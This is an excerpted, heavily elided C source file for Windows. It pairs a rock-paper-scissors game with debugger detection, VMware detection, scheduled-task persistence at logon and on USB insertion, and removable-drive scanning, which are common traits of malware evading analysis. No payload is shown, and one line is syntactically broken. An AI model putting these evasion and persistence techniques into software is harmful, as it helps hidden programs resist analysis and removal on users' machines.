...
#pragma comment(lib, "strsafe.lib") // for StringCchPrintfA
...
BOOL is_debugged() {
    BOOL is_dbg = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &is_dbg);
    return is_dbg;
}

BOOL is_vm() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\WMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
...
void task_sch_logon() {
    char exepath[MAX_PATH] = {0}; //finding current executable
    char cmd[MAX_PATH + 256] = {0}; // buffer for the rest of the code

    if (!GetModuleFileNameA(NULL, exepath, MAX_PATH)) {
        return;
    }

    StringCchPrintfA(cmd, _countof(cmd),    // "_countof(cmd)" dont treat pointers as arrays
...
BOOL past_usb_check(){
    ...
    // fixed last script only checked most recent event, if that event was a mouse..
    for (int i = 0; i < 10 && EvtNext(hQuery, 1, &hEvent, 0, 0, &returned) && returned > 0; i++) {
        found = TRUE;
        EvtClose(hEvent);
        if (found) break; // no point in going if its found
    }
    EvtClose(hQuery);
    return found;
}
...
void task_sch_usb() {
    ...
    char cmd[MAX_PATH + 512] = {0};
    if (!GetModuleFileNameA(NULL, exepath, MAX_PATH)) return;

    StringCchPrintfA(cmd, _countof(cmd), 
...
void check_usb_threshold(ULONGLONG threshold) {
    for (int b = 0; b < 26; b++) {
            if (drive_mask & (1 << b)) {
                ...
                // filter for removable usb's only
...
void safe() {
    ...
    StringCchPrintfA(cmd, _countof(cmd)"schtasks /delete /tn \"%s\" /f", rand_nm);
    system(cmd);
...
void game() {
	...
	int robot = rand() % 3 + 1;
	int play;
    char input[16] = {0}; //im so stupid Did i really not have that?
